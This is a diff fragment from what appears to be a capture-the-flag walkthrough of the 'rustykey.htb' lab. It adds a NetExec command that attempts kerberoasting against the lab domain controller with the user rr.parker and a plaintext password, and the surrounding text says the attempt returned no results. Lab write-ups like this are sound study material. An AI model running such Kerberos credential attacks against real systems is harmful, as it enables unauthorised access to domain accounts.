@@ -45,7 +45,7 @@
 
 5. However, with rr.parker, there is no way to nn.marcos. After much enumeration and dead ends, we try kerberoasting to gain initial access. But we get no results for it
 
-``
+`nxc ldap dc.rustykey.htb -u rr.parker -p "8#t5HE8L\!W3A" -k --kerberoasting kerberoast.txt`
 
 ![image](https://github.com/user-attachments/assets/f06dbd5b-a301-42a9-9034-1a996a147349)
 
